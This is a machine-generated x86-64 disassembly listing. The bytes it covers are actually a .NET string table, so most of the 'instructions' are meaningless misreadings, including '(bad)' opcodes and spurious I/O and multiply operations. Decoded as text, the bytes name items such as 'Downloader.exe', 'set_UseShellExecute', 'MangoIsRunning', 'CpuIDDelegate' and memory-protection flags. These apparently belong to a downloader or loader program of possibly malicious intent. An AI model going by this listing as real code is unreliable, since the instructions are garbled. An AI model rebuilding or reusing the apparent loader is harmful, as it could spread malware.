   140003be1:	75 61                	jne    0x140003c44
   140003be3:	6c                   	insb   (%dx),(%rdi)
   140003be4:	46 72 65             	rex.RX jb 0x140003c4c
   140003be7:	65 00 45 6e          	add    %al,%gs:0x6e(%rbp)
   140003beb:	64 49 6e             	rex.WB outsb %fs:(%rsi),(%dx)
   140003bee:	76 6f                	jbe    0x140003c5f
   140003bf0:	6b 65 00 42          	imul   $0x42,0x0(%rbp),%esp
   140003bf4:	65 67 69 6e 49 6e 76 	imul   $0x6b6f766e,%gs:0x49(%esi),%ebp
   140003bfb:	6f 6b 
   140003bfd:	65 00 5f 43          	add    %bl,%gs:0x43(%rdi)
   140003c01:	72 63                	jb     0x140003c66
   140003c03:	54                   	push   %rsp
   140003c04:	61                   	(bad)
   140003c05:	62 6c 65 00 45       	(bad)
   140003c0a:	6e                   	outsb  (%rsi),(%dx)
   140003c0b:	75 6d                	jne    0x140003c7a
   140003c0d:	65 72 61             	gs jb  0x140003c71
   140003c10:	62 6c 65 00 47       	(bad)
   140003c15:	43                   	rex.XB
   140003c16:	48 61                	rex.W (bad)
   140003c18:	6e                   	outsb  (%rsi),(%dx)
   140003c19:	64 6c                	fs insb (%dx),(%rdi)
   140003c1b:	65 00 52 75          	add    %dl,%gs:0x75(%rdx)
   140003c1f:	6e                   	outsb  (%rsi),(%dx)
   140003c20:	74 69                	je     0x140003c8b
   140003c22:	6d                   	insl   (%dx),(%rdi)
   140003c23:	65 46 69 65 6c 64 48 	rex.RX imul $0x6e614864,%gs:0x6c(%rbp),%r12d
   140003c2a:	61 6e 
   140003c2c:	64 6c                	fs insb (%dx),(%rdi)
   140003c2e:	65 00 52 75          	add    %dl,%gs:0x75(%rdx)
   140003c32:	6e                   	outsb  (%rsi),(%dx)
   140003c33:	74 69                	je     0x140003c9e
   140003c35:	6d                   	insl   (%dx),(%rdi)
   140003c36:	65 54                	gs push %rsp
   140003c38:	79 70                	jns    0x140003caa
   140003c3a:	65 48 61             	gs rex.W (bad)
   140003c3d:	6e                   	outsb  (%rsi),(%dx)
   140003c3e:	64 6c                	fs insb (%dx),(%rdi)
   140003c40:	65 00 47 65          	add    %al,%gs:0x65(%rdi)
   140003c44:	74 54                	je     0x140003c9a
   140003c46:	79 70                	jns    0x140003cb8
   140003c48:	65 46 72 6f          	gs rex.RX jb 0x140003cbb
   140003c4c:	6d                   	insl   (%dx),(%rdi)
   140003c4d:	48 61                	rex.W (bad)
   140003c4f:	6e                   	outsb  (%rsi),(%dx)
   140003c50:	64 6c                	fs insb (%dx),(%rdi)
   140003c52:	65 00 67 65          	add    %ah,%gs:0x65(%rdi)
   140003c56:	74 5f                	je     0x140003cb7
   140003c58:	41 73 79             	rex.B jae 0x140003cd4
   140003c5b:	6e                   	outsb  (%rsi),(%dx)
   140003c5c:	63 57 61             	movsxd 0x61(%rdi),%edx
   140003c5f:	69 74 48 61 6e 64 6c 	imul   $0x656c646e,0x61(%rax,%rcx,2),%esi
   140003c66:	65 
   140003c67:	00 45 76             	add    %al,0x76(%rbp)
   140003c6a:	65 6e                	outsb  %gs:(%rsi),(%dx)
   140003c6c:	74 57                	je     0x140003cc5
   140003c6e:	61                   	(bad)
   140003c6f:	69 74 48 61 6e 64 6c 	imul   $0x656c646e,0x61(%rax,%rcx,2),%esi
   140003c76:	65 
   140003c77:	00 43 6f             	add    %al,0x6f(%rbx)
   140003c7a:	6d                   	insl   (%dx),(%rdi)
   140003c7b:	70 69                	jo     0x140003ce6
   140003c7d:	6c                   	insb   (%dx),(%rdi)
   140003c7e:	65 00 4d 6f          	add    %cl,%gs:0x6f(%rbp)
   140003c82:	6e                   	outsb  (%rsi),(%dx)
   140003c83:	67 6f                	outsl  (%esi),(%dx)
   140003c85:	52                   	push   %rdx
   140003c86:	75 6e                	jne    0x140003cf6
   140003c88:	42 79 53             	rex.X jns 0x140003cde
   140003c8b:	63 68 65             	movsxd 0x65(%rax),%ebp
   140003c8e:	64 75 6c             	fs jne 0x140003cfd
   140003c91:	65 00 67 65          	add    %ah,%gs:0x65(%rdi)
   140003c95:	74 5f                	je     0x140003cf6
   140003c97:	4d 61                	rex.WRB (bad)
   140003c99:	69 6e 4d 6f 64 75 6c 	imul   $0x6c75646f,0x4d(%rsi),%ebp
   140003ca0:	65 00 50 72          	add    %dl,%gs:0x72(%rax)
   140003ca4:	6f                   	outsl  (%rsi),(%dx)
   140003ca5:	63 65 73             	movsxd 0x73(%rbp),%esp
   140003ca8:	73 4d                	jae    0x140003cf7
   140003caa:	6f                   	outsl  (%rsi),(%dx)
   140003cab:	64 75 6c             	fs jne 0x140003d1a
   140003cae:	65 00 67 65          	add    %ah,%gs:0x65(%rdi)
   140003cb2:	74 5f                	je     0x140003d13
   140003cb4:	46 69 6c 65 4e 61 6d 	imul   $0x656d61,0x4e(%rbp,%r12,2),%r13d
   140003cbb:	65 00 
   140003cbd:	73 65                	jae    0x140003d24
   140003cbf:	74 5f                	je     0x140003d20
   140003cc1:	46 69 6c 65 4e 61 6d 	imul   $0x656d61,0x4e(%rbp,%r12,2),%r13d
   140003cc8:	65 00 
   140003cca:	67 65 74 5f          	addr32 gs je 0x140003d2d
   140003cce:	4d 61                	rex.WRB (bad)
   140003cd0:	63 68 69             	movsxd 0x69(%rax),%ebp
   140003cd3:	6e                   	outsb  (%rsi),(%dx)
   140003cd4:	65 4e 61             	gs rex.WRX (bad)
   140003cd7:	6d                   	insl   (%dx),(%rdi)
   140003cd8:	65 00 67 65          	add    %ah,%gs:0x65(%rdi)
   140003cdc:	74 5f                	je     0x140003d3d
   140003cde:	50                   	push   %rax
   140003cdf:	72 6f                	jb     0x140003d50
   140003ce1:	63 65 73             	movsxd 0x73(%rbp),%esp
   140003ce4:	73 4e                	jae    0x140003d34
   140003ce6:	61                   	(bad)
   140003ce7:	6d                   	insl   (%dx),(%rdi)
   140003ce8:	65 00 5f 56          	add    %bl,%gs:0x56(%rdi)
   140003cec:	65 63 50 72          	movsxd %gs:0x72(%rax),%edx
   140003cf0:	6f                   	outsl  (%rsi),(%dx)
   140003cf1:	63 65 73             	movsxd 0x73(%rbp),%esp
   140003cf4:	73 4e                	jae    0x140003d44
   140003cf6:	61                   	(bad)
   140003cf7:	6d                   	insl   (%dx),(%rdi)
   140003cf8:	65 00 52 65          	add    %dl,%gs:0x65(%rdx)
   140003cfc:	71 75                	jno    0x140003d73
   140003cfe:	65 73 74             	gs jae 0x140003d75
   140003d01:	4e 61                	rex.WRX (bad)
   140003d03:	6d                   	insl   (%dx),(%rdi)
   140003d04:	65 00 57 61          	add    %dl,%gs:0x61(%rdi)
   140003d08:	69 74 4f 6e 65 00 64 	imul   $0x77640065,0x6e(%rdi,%rcx,2),%esi
   140003d0f:	77 
   140003d10:	46 72 65             	rex.RX jb 0x140003d78
   140003d13:	65 54                	gs push %rsp
   140003d15:	79 70                	jns    0x140003d87
   140003d17:	65 00 47 43          	add    %al,%gs:0x43(%rdi)
   140003d1b:	48 61                	rex.W (bad)
   140003d1d:	6e                   	outsb  (%rsi),(%dx)
   140003d1e:	64 6c                	fs insb (%dx),(%rdi)
   140003d20:	65 54                	gs push %rsp
   140003d22:	79 70                	jns    0x140003d94
   140003d24:	65 00 56 61          	add    %dl,%gs:0x61(%rsi)
   140003d28:	6c                   	insb   (%dx),(%rdi)
   140003d29:	75 65                	jne    0x140003d90
   140003d2b:	54                   	push   %rsp
   140003d2c:	79 70                	jns    0x140003d9e
   140003d2e:	65 00 50 72          	add    %dl,%gs:0x72(%rax)
   140003d32:	6f                   	outsl  (%rsi),(%dx)
   140003d33:	74 6f                	je     0x140003da4
   140003d35:	63 6f 6c             	movsxd 0x6c(%rdi),%ebp
   140003d38:	54                   	push   %rsp
   140003d39:	79 70                	jns    0x140003dab
   140003d3b:	65 00 66 6c          	add    %ah,%gs:0x6c(%rsi)
   140003d3f:	41 6c                	rex.B insb (%dx),(%rdi)
   140003d41:	6c                   	insb   (%dx),(%rdi)
   140003d42:	6f                   	outsl  (%rsi),(%dx)
   140003d43:	63 61 74             	movsxd 0x74(%rcx),%esp
   140003d46:	69 6f 6e 54 79 70 65 	imul   $0x65707954,0x6e(%rdi),%ebp
   140003d4d:	00 53 6f             	add    %dl,0x6f(%rbx)
   140003d50:	63 6b 65             	movsxd 0x65(%rbx),%ebp
   140003d53:	74 54                	je     0x140003da9
   140003d55:	79 70                	jns    0x140003dc7
   140003d57:	65 00 53 79          	add    %dl,%gs:0x79(%rbx)
   140003d5b:	73 74                	jae    0x140003dd1
   140003d5d:	65 6d                	gs insl (%dx),(%rdi)
   140003d5f:	2e 43 6f             	cs rex.XB outsl (%rsi),(%dx)
   140003d62:	72 65                	jb     0x140003dc9
   140003d64:	00 4d 65             	add    %cl,0x65(%rbp)
   140003d67:	74 68                	je     0x140003dd1
   140003d69:	6f                   	outsl  (%rsi),(%dx)
   140003d6a:	64 42 61             	fs rex.X (bad)
   140003d6d:	73 65                	jae    0x140003dd4
   140003d6f:	00 43 6c             	add    %al,0x6c(%rbx)
   140003d72:	6f                   	outsl  (%rsi),(%dx)
   140003d73:	73 65                	jae    0x140003dda
   140003d75:	00 44 69 73          	add    %al,0x73(%rcx,%rbp,2)
   140003d79:	70 6f                	jo     0x140003dea
   140003d7b:	73 65                	jae    0x140003de2
   140003d7d:	00 54 72 79          	add    %dl,0x79(%rdx,%rsi,2)
   140003d81:	50                   	push   %rax
   140003d82:	61                   	(bad)
   140003d83:	72 73                	jb     0x140003df8
   140003d85:	65 00 43 70          	add    %al,%gs:0x70(%rbx)
   140003d89:	75 49                	jne    0x140003dd4
   140003d8b:	44                   	rex.R
   140003d8c:	44                   	rex.R
   140003d8d:	65 6c                	gs insb (%dx),(%rdi)
   140003d8f:	65 67 61             	gs addr32 (bad)
   140003d92:	74 65                	je     0x140003df9
   140003d94:	00 4d 75             	add    %cl,0x75(%rbp)
   140003d97:	6c                   	insb   (%dx),(%rdi)
   140003d98:	74 69                	je     0x140003e03
   140003d9a:	63 61 73             	movsxd 0x73(%rcx),%esp
   140003d9d:	74 44                	je     0x140003de3
   140003d9f:	65 6c                	gs insb (%dx),(%rdi)
   140003da1:	65 67 61             	gs addr32 (bad)
   140003da4:	74 65                	je     0x140003e0b
   140003da6:	00 43 6f             	add    %al,0x6f(%rbx)
   140003da9:	6d                   	insl   (%dx),(%rdi)
   140003daa:	70 69                	jo     0x140003e15
   140003dac:	6c                   	insb   (%dx),(%rdi)
   140003dad:	65 72 47             	gs jb  0x140003df7
   140003db0:	65 6e                	outsb  %gs:(%rsi),(%dx)
   140003db2:	65 72 61             	gs jb  0x140003e16
   140003db5:	74 65                	je     0x140003e1c
   140003db7:	64 41 74 74          	fs rex.B je 0x140003e2f
   140003dbb:	72 69                	jb     0x140003e26
   140003dbd:	62 75 74 65 00       	(bad)
   140003dc2:	47 75 69             	rex.RXB jne 0x140003e2e
   140003dc5:	64 41 74 74          	fs rex.B je 0x140003e3d
   140003dc9:	72 69                	jb     0x140003e34
   140003dcb:	62 75 74 65 00       	(bad)
   140003dd0:	44                   	rex.R
   140003dd1:	65 62 75 67 67 61    	(bad)
   140003dd7:	62 6c 65 41 74       	(bad)
   140003ddc:	74 72                	je     0x140003e50
   140003dde:	69 62 75 74 65 00 43 	imul   $0x43006574,0x75(%rdx),%esp
   140003de5:	6f                   	outsl  (%rsi),(%dx)
   140003de6:	6d                   	insl   (%dx),(%rdi)
   140003de7:	56                   	push   %rsi
   140003de8:	69 73 69 62 6c 65 41 	imul   $0x41656c62,0x69(%rbx),%esi
   140003def:	74 74                	je     0x140003e65
   140003df1:	72 69                	jb     0x140003e5c
   140003df3:	62 75 74 65 00       	(bad)
   140003df8:	41 73 73             	rex.B jae 0x140003e6e
   140003dfb:	65 6d                	gs insl (%dx),(%rdi)
   140003dfd:	62 6c 79 54 69       	(bad)
   140003e02:	74 6c                	je     0x140003e70
   140003e04:	65 41 74 74          	gs rex.B je 0x140003e7c
   140003e08:	72 69                	jb     0x140003e73
   140003e0a:	62 75 74 65 00       	(bad)
   140003e0f:	41 73 73             	rex.B jae 0x140003e85
   140003e12:	65 6d                	gs insl (%dx),(%rdi)
   140003e14:	62 6c 79 54 72       	(bad)
   140003e19:	61                   	(bad)
   140003e1a:	64 65 6d             	fs gs insl (%dx),(%rdi)
   140003e1d:	61                   	(bad)
   140003e1e:	72 6b                	jb     0x140003e8b
   140003e20:	41 74 74             	rex.B je 0x140003e97
   140003e23:	72 69                	jb     0x140003e8e
   140003e25:	62 75 74 65 00       	(bad)
   140003e2a:	54                   	push   %rsp
   140003e2b:	61                   	(bad)
   140003e2c:	72 67                	jb     0x140003e95
   140003e2e:	65 74 46             	gs je  0x140003e77
   140003e31:	72 61                	jb     0x140003e94
   140003e33:	6d                   	insl   (%dx),(%rdi)
   140003e34:	65 77 6f             	gs ja  0x140003ea6
   140003e37:	72 6b                	jb     0x140003ea4
   140003e39:	41 74 74             	rex.B je 0x140003eb0
   140003e3c:	72 69                	jb     0x140003ea7
   140003e3e:	62 75 74 65 00       	(bad)
   140003e43:	41 73 73             	rex.B jae 0x140003eb9
   140003e46:	65 6d                	gs insl (%dx),(%rdi)
   140003e48:	62 6c 79 46 69       	(bad)
   140003e4d:	6c                   	insb   (%dx),(%rdi)
   140003e4e:	65 56                	gs push %rsi
   140003e50:	65 72 73             	gs jb  0x140003ec6
   140003e53:	69 6f 6e 41 74 74 72 	imul   $0x72747441,0x6e(%rdi),%ebp
   140003e5a:	69 62 75 74 65 00 41 	imul   $0x41006574,0x75(%rdx),%esp
   140003e61:	73 73                	jae    0x140003ed6
   140003e63:	65 6d                	gs insl (%dx),(%rdi)
   140003e65:	62 6c 79 43 6f       	(bad)
   140003e6a:	6e                   	outsb  (%rsi),(%dx)
   140003e6b:	66 69 67 75 72 61    	imul   $0x6172,0x75(%rdi),%sp
   140003e71:	74 69                	je     0x140003edc
   140003e73:	6f                   	outsl  (%rsi),(%dx)
   140003e74:	6e                   	outsb  (%rsi),(%dx)
   140003e75:	41 74 74             	rex.B je 0x140003eec
   140003e78:	72 69                	jb     0x140003ee3
   140003e7a:	62 75 74 65 00       	(bad)
   140003e7f:	41 73 73             	rex.B jae 0x140003ef5
   140003e82:	65 6d                	gs insl (%dx),(%rdi)
   140003e84:	62 6c 79 44 65       	(bad)
   140003e89:	73 63                	jae    0x140003eee
   140003e8b:	72 69                	jb     0x140003ef6
   140003e8d:	70 74                	jo     0x140003f03
   140003e8f:	69 6f 6e 41 74 74 72 	imul   $0x72747441,0x6e(%rdi),%ebp
   140003e96:	69 62 75 74 65 00 55 	imul   $0x55006574,0x75(%rdx),%esp
   140003e9d:	6e                   	outsb  (%rsi),(%dx)
   140003e9e:	6d                   	insl   (%dx),(%rdi)
   140003e9f:	61                   	(bad)
   140003ea0:	6e                   	outsb  (%rsi),(%dx)
   140003ea1:	61                   	(bad)
   140003ea2:	67 65 64 46 75 6e    	addr32 gs fs rex.RX jne 0x140003f16
   140003ea8:	63 74 69 6f          	movsxd 0x6f(%rcx,%rbp,2),%esi
   140003eac:	6e                   	outsb  (%rsi),(%dx)
   140003ead:	50                   	push   %rax
   140003eae:	6f                   	outsl  (%rsi),(%dx)
   140003eaf:	69 6e 74 65 72 41 74 	imul   $0x74417265,0x74(%rsi),%ebp
   140003eb6:	74 72                	je     0x140003f2a
   140003eb8:	69 62 75 74 65 00 46 	imul   $0x46006574,0x75(%rdx),%esp
   140003ebf:	6c                   	insb   (%dx),(%rdi)
   140003ec0:	61                   	(bad)
   140003ec1:	67 73 41             	addr32 jae 0x140003f05
   140003ec4:	74 74                	je     0x140003f3a
   140003ec6:	72 69                	jb     0x140003f31
   140003ec8:	62 75 74 65 00       	(bad)
   140003ecd:	43 6f                	rex.XB outsl (%rsi),(%dx)
   140003ecf:	6d                   	insl   (%dx),(%rdi)
   140003ed0:	70 69                	jo     0x140003f3b
   140003ed2:	6c                   	insb   (%dx),(%rdi)
   140003ed3:	61                   	(bad)
   140003ed4:	74 69                	je     0x140003f3f
   140003ed6:	6f                   	outsl  (%rsi),(%dx)
   140003ed7:	6e                   	outsb  (%rsi),(%dx)
   140003ed8:	52                   	push   %rdx
   140003ed9:	65 6c                	gs insb (%dx),(%rdi)
   140003edb:	61                   	(bad)
   140003edc:	78 61                	js     0x140003f3f
   140003ede:	74 69                	je     0x140003f49
   140003ee0:	6f                   	outsl  (%rsi),(%dx)
   140003ee1:	6e                   	outsb  (%rsi),(%dx)
   140003ee2:	73 41                	jae    0x140003f25
   140003ee4:	74 74                	je     0x140003f5a
   140003ee6:	72 69                	jb     0x140003f51
   140003ee8:	62 75 74 65 00       	(bad)
   140003eed:	41 73 73             	rex.B jae 0x140003f63
   140003ef0:	65 6d                	gs insl (%dx),(%rdi)
   140003ef2:	62 6c 79 50 72       	(bad)
   140003ef7:	6f                   	outsl  (%rsi),(%dx)
   140003ef8:	64 75 63             	fs jne 0x140003f5e
   140003efb:	74 41                	je     0x140003f3e
   140003efd:	74 74                	je     0x140003f73
   140003eff:	72 69                	jb     0x140003f6a
   140003f01:	62 75 74 65 00       	(bad)
   140003f06:	41 73 73             	rex.B jae 0x140003f7c
   140003f09:	65 6d                	gs insl (%dx),(%rdi)
   140003f0b:	62 6c 79 43 6f       	(bad)
   140003f10:	70 79                	jo     0x140003f8b
   140003f12:	72 69                	jb     0x140003f7d
   140003f14:	67 68 74 41 74 74    	addr32 push $0x74744174
   140003f1a:	72 69                	jb     0x140003f85
   140003f1c:	62 75 74 65 00       	(bad)
   140003f21:	41 73 73             	rex.B jae 0x140003f97
   140003f24:	65 6d                	gs insl (%dx),(%rdi)
   140003f26:	62 6c 79 43 6f       	(bad)
   140003f2b:	6d                   	insl   (%dx),(%rdi)
   140003f2c:	70 61                	jo     0x140003f8f
   140003f2e:	6e                   	outsb  (%rsi),(%dx)
   140003f2f:	79 41                	jns    0x140003f72
   140003f31:	74 74                	je     0x140003fa7
   140003f33:	72 69                	jb     0x140003f9e
   140003f35:	62 75 74 65 00       	(bad)
   140003f3a:	52                   	push   %rdx
   140003f3b:	75 6e                	jne    0x140003fab
   140003f3d:	74 69                	je     0x140003fa8
   140003f3f:	6d                   	insl   (%dx),(%rdi)
   140003f40:	65 43 6f             	rex.XB outsl %gs:(%rsi),(%dx)
   140003f43:	6d                   	insl   (%dx),(%rdi)
   140003f44:	70 61                	jo     0x140003fa7
   140003f46:	74 69                	je     0x140003fb1
   140003f48:	62 69 6c 69 74       	(bad)
   140003f4d:	79 41                	jns    0x140003f90
   140003f4f:	74 74                	je     0x140003fc5
   140003f51:	72 69                	jb     0x140003fbc
   140003f53:	62 75 74 65 00       	(bad)
   140003f58:	73 65                	jae    0x140003fbf
   140003f5a:	74 5f                	je     0x140003fbb
   140003f5c:	55                   	push   %rbp
   140003f5d:	73 65                	jae    0x140003fc4
   140003f5f:	53                   	push   %rbx
   140003f60:	68 65 6c 6c 45       	push   $0x456c6c65
   140003f65:	78 65                	js     0x140003fcc
   140003f67:	63 75 74             	movsxd 0x74(%rbp),%esi
   140003f6a:	65 00 42 79          	add    %al,%gs:0x79(%rdx)
   140003f6e:	74 65                	je     0x140003fd5
   140003f70:	00 76 61             	add    %dh,0x61(%rsi)
   140003f73:	6c                   	insb   (%dx),(%rdi)
   140003f74:	75 65                	jne    0x140003fdb
   140003f76:	00 52 65             	add    %dl,0x65(%rdx)
   140003f79:	63 65 69             	movsxd 0x69(%rbp),%esp
   140003f7c:	76 65                	jbe    0x140003fe3
   140003f7e:	00 44 6f 77          	add    %al,0x77(%rdi,%rbp,2)
   140003f82:	6e                   	outsb  (%rsi),(%dx)
   140003f83:	6c                   	insb   (%dx),(%rdi)
   140003f84:	6f                   	outsl  (%rsi),(%dx)
   140003f85:	61                   	(bad)
   140003f86:	64 65 72 2e          	fs gs jb 0x140003fb8
   140003f8a:	65 78 65             	gs js  0x140003ff2
   140003f8d:	00 67 65             	add    %ah,0x65(%rdi)
   140003f90:	74 5f                	je     0x140003ff1
   140003f92:	53                   	push   %rbx
   140003f93:	69 7a 65 00 64 77 53 	imul   $0x53776400,0x65(%rdx),%edi
   140003f9a:	69 7a 65 00 46 69 6e 	imul   $0x6e694600,0x65(%rdx),%edi
   140003fa1:	61                   	(bad)
   140003fa2:	6c                   	insb   (%dx),(%rdi)
   140003fa3:	69 7a 65 00 47 55 41 	imul   $0x41554700,0x65(%rdx),%edi
   140003faa:	52                   	push   %rdx
   140003fab:	44 5f                	rex.R pop %rdi
   140003fad:	4d 6f                	rex.WRB outsl (%rsi),(%dx)
   140003faf:	64 69 66 69 65 72 66 	imul   $0x6c667265,%fs:0x69(%rsi),%esp
   140003fb6:	6c 
   140003fb7:	61                   	(bad)
   140003fb8:	67 00 4e 4f          	add    %cl,0x4f(%esi)
   140003fbc:	43                   	rex.XB
   140003fbd:	41                   	rex.B
   140003fbe:	43                   	rex.XB
   140003fbf:	48                   	rex.W
   140003fc0:	45 5f                	rex.RB pop %r15
   140003fc2:	4d 6f                	rex.WRB outsl (%rsi),(%dx)
   140003fc4:	64 69 66 69 65 72 66 	imul   $0x6c667265,%fs:0x69(%rsi),%esp
   140003fcb:	6c 
   140003fcc:	61                   	(bad)
   140003fcd:	67 00 57 52          	add    %dl,0x52(%edi)
   140003fd1:	49 54                	rex.WB push %r12
   140003fd3:	45                   	rex.RB
   140003fd4:	43                   	rex.XB
   140003fd5:	4f                   	rex.WRXB
   140003fd6:	4d                   	rex.WRB
   140003fd7:	42                   	rex.X
   140003fd8:	49                   	rex.WB
   140003fd9:	4e                   	rex.WRX
   140003fda:	45 5f                	rex.RB pop %r15
   140003fdc:	4d 6f                	rex.WRB outsl (%rsi),(%dx)
   140003fde:	64 69 66 69 65 72 66 	imul   $0x6c667265,%fs:0x69(%rsi),%esp
   140003fe5:	6c 
   140003fe6:	61                   	(bad)
   140003fe7:	67 00 63 70          	add    %ah,0x70(%ebx)
   140003feb:	75 49                	jne    0x140004036
   140003fed:	64 44                	fs rex.R
   140003fef:	65 6c                	gs insb (%dx),(%rdi)
   140003ff1:	67 00 53 79          	add    %dl,0x79(%ebx)
   140003ff5:	73 74                	jae    0x14000406b
   140003ff7:	65 6d                	gs insl (%dx),(%rdi)
   140003ff9:	2e 54                	cs push %rsp
   140003ffb:	68 72 65 61 64       	push   $0x64616572
   140004000:	69 6e 67 00 45 6e 63 	imul   $0x636e4500,0x67(%rsi),%ebp
   140004007:	6f                   	outsl  (%rsi),(%dx)
   140004008:	64 69 6e 67 00 4d 61 	imul   $0x6e614d00,%fs:0x67(%rsi),%ebp
   14000400f:	6e 
   140004010:	67 6f                	outsl  (%esi),(%dx)
   140004012:	49 73 52             	rex.WB jae 0x140004067
   140004015:	75 6e                	jne    0x140004085
   140004017:	6e                   	outsb  (%rsi),(%dx)
   140004018:	69 6e 67 00 53 79 73 	imul   $0x73795300,0x67(%rsi),%ebp
   14000401f:	74 65                	je     0x140004086
   140004021:	6d                   	insl   (%dx),(%rdi)
   140004022:	2e 52                	cs push %rdx
   140004024:	75 6e                	jne    0x140004094
   140004026:	74 69                	je     0x140004091
   140004028:	6d                   	insl   (%dx),(%rdi)
   140004029:	65 2e 56             	gs cs push %rsi
   14000402c:	65 72 73             	gs jb  0x1400040a2
   14000402f:	69 6f 6e 69 6e 67 00 	imul   $0x676e69,0x6e(%rdi),%ebp
   140004036:	54                   	push   %rsp
   140004037:	6f                   	outsl  (%rsi),(%dx)
   140004038:	53                   	push   %rbx
   140004039:	74 72                	je     0x1400040ad
   14000403b:	69 6e 67 00 53 75 62 	imul   $0x62755300,0x67(%rsi),%ebp
   140004042:	73 74                	jae    0x1400040b8
   140004044:	72 69                	jb     0x1400040af
   140004046:	6e                   	outsb  (%rsi),(%dx)
   140004047:	67 00 5f 47          	add    %bl,0x47(%edi)
   14000404b:	75 69                	jne    0x1400040b6
   14000404d:	64 48 61             	fs rex.W (bad)
   140004050:	73 68                	jae    0x1400040ba
   140004052:	00 47 65             	add    %al,0x65(%rdi)
   140004055:	74 47                	je     0x14000409e
   140004057:	75 69                	jne    0x1400040c2
   140004059:	64 48 61             	fs rex.W (bad)
   14000405c:	73 68                	jae    0x1400040c6
   14000405e:	00 4c 65 6e          	add    %cl,0x6e(%rbp,%riz,2)
   140004062:	67 74 68             	addr32 je 0x1400040cd
   140004065:	00 41 73             	add    %al,0x73(%rcx)
   140004068:	79 6e                	jns    0x1400040d8
   14000406a:	63 43 61             	movsxd 0x61(%rbx),%eax
   14000406d:	6c                   	insb   (%dx),(%rdi)
   14000406e:	6c                   	insb   (%dx),(%rdi)
   14000406f:	62 61 63 6b 00       	(bad)
   140004074:	63 61 6c             	movsxd 0x6c(%rcx),%esp
   140004077:	6c                   	insb   (%dx),(%rdi)
   140004078:	62 61 63 6b 00       	(bad)
   14000407d:	54                   	push   %rsp
   14000407e:	61                   	(bad)
   14000407f:	73 6b                	jae    0x1400040ec
   140004081:	00 4d 61             	add    %cl,0x61(%rbp)
   140004084:	72 73                	jb     0x1400040f9
   140004086:	68 61 6c 00 6c       	push   $0x6c006c61
   14000408b:	65 76 65             	gs jbe 0x1400040f3
   14000408e:	6c                   	insb   (%dx),(%rdi)
   14000408f:	00 6b 65             	add    %ch,0x65(%rbx)
   140004092:	72 6e                	jb     0x140004102
   140004094:	65 6c                	gs insb (%dx),(%rdi)
   140004096:	33 32                	xor    (%rdx),%esi
   140004098:	2e 64 6c             	cs fs insb (%dx),(%rdi)
   14000409b:	6c                   	insb   (%dx),(%rdi)
   14000409c:	00 41 72             	add    %al,0x72(%rcx)
   14000409f:	67 50                	addr32 push %rax
   1400040a1:	61                   	(bad)
   1400040a2:	72 61                	jb     0x140004105
   1400040a4:	6d                   	insl   (%dx),(%rdi)
   1400040a5:	00 50 72             	add    %dl,0x72(%rax)
   1400040a8:	6f                   	outsl  (%rsi),(%dx)
   1400040a9:	67 72 61             	addr32 jb 0x14000410d
   1400040ac:	6d                   	insl   (%dx),(%rdi)
   1400040ad:	00 53 79             	add    %dl,0x79(%rbx)
   1400040b0:	73 74                	jae    0x140004126
   1400040b2:	65 6d                	gs insl (%dx),(%rdi)
   1400040b4:	00 52 61             	add    %dl,0x61(%rdx)
   1400040b7:	6e                   	outsb  (%rsi),(%dx)
   1400040b8:	64 6f                	outsl  %fs:(%rsi),(%dx)
   1400040ba:	6d                   	insl   (%dx),(%rdi)
   1400040bb:	00 69 74             	add    %ch,0x74(%rcx)
   1400040be:	6d                   	insl   (%dx),(%rdi)
   1400040bf:	00 47 65             	add    %al,0x65(%rdi)
   1400040c2:	74 43                	je     0x140004107
   1400040c4:	68 65 63 6b 53       	push   $0x536b6365
   1400040c9:	75 6d                	jne    0x140004138
   1400040cb:	00 45 6e             	add    %al,0x6e(%rbp)
   1400040ce:	75 6d                	jne    0x14000413d
   1400040d0:	00 44 6f 6d          	add    %al,0x6d(%rdi,%rbp,2)
   1400040d4:	69 61 6e 00 4d 61 69 	imul   $0x69614d00,0x6e(%rcx),%esp
   1400040db:	6e                   	outsb  (%rsi),(%dx)
   1400040dc:	00 44 6f 6d          	add    %al,0x6d(%rdi,%rbp,2)
   1400040e0:	61                   	(bad)
   1400040e1:	69 6e 00 44 6f 77 6e 	imul   $0x6e776f44,0x0(%rsi),%ebp
   1400040e8:	6c                   	insb   (%dx),(%rdi)
   1400040e9:	6f                   	outsl  (%rsi),(%dx)
   1400040ea:	61                   	(bad)
   1400040eb:	64 65 72 56          	fs gs jb 0x140004145
   1400040ef:	65 72 73             	gs jb  0x140004165
   1400040f2:	69 6f 6e 00 53 79 73 	imul   $0x73795300,0x6e(%rdi),%ebp
   1400040f9:	74 65                	je     0x140004160
   1400040fb:	6d                   	insl   (%dx),(%rdi)
   1400040fc:	2e 4e                	cs rex.WRX
   1400040fe:	65 74 2e             	gs je  0x14000412f
   140004101:	4e                   	rex.WRX
   140004102:	65 74 77             	gs je  0x14000417c
   140004105:	6f                   	outsl  (%rsi),(%dx)
   140004106:	72 6b                	jb     0x140004173
   140004108:	49 6e                	rex.WB outsb (%rsi),(%dx)
   14000410a:	66 6f                	outsw  (%rsi),(%dx)
   14000410c:	72 6d                	jb     0x14000417b
   14000410e:	61                   	(bad)
   14000410f:	74 69                	je     0x14000417a
   140004111:	6f                   	outsl  (%rsi),(%dx)
   140004112:	6e                   	outsb  (%rsi),(%dx)
   140004113:	00 41 63             	add    %al,0x63(%rcx)
   140004116:	74 69                	je     0x140004181
   140004118:	6f                   	outsl  (%rsi),(%dx)
   140004119:	6e                   	outsb  (%rsi),(%dx)
   14000411a:	00 53 79             	add    %dl,0x79(%rbx)
   14000411d:	73 74                	jae    0x140004193
   14000411f:	65 6d                	gs insl (%dx),(%rdi)
   140004121:	2e 52                	cs push %rdx
   140004123:	65 66 6c             	gs data16 insb (%dx),(%rdi)
   140004126:	65 63 74 69 6f       	movsxd %gs:0x6f(%rcx,%rbp,2),%esi
   14000412b:	6e                   	outsb  (%rsi),(%dx)
   14000412c:	00 4d 65             	add    %cl,0x65(%rbp)
   14000412f:	6d                   	insl   (%dx),(%rdi)
   140004130:	6f                   	outsl  (%rsi),(%dx)
   140004131:	72 79                	jb     0x1400041ac
   140004133:	50                   	push   %rax
   140004134:	72 6f                	jb     0x1400041a5
   140004136:	74 65                	je     0x14000419d
   140004138:	63 74 69 6f          	movsxd 0x6f(%rcx,%rbp,2),%esi
   14000413c:	6e                   	outsb  (%rsi),(%dx)
   14000413d:	00 43 61             	add    %al,0x61(%rbx)
   140004140:	6c                   	insb   (%dx),(%rdi)
   140004141:	6c                   	insb   (%dx),(%rdi)
   140004142:	69 6e 67 43 6f 6e 76 	imul   $0x766e6f43,0x67(%rsi),%ebp
   140004149:	65 6e                	outsb  %gs:(%rsi),(%dx)
